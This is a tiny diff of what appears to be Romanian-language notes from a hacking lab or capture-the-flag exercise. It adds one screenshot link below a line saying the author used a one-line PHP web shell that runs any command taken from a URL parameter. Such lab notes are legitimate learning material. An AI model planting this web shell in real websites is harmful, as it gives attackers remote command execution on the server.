@@ -14,3 +14,4 @@ Am folosit `<?php echo system($_GET['command']); ?>`
 
 ![](../../attachments/Pasted%20image%2020261019133303.png)
 ![](../../attachments/Pasted%20image%2020261019133331.png)
+![](../../attachments/Pasted%20image%2020261019133426.png)
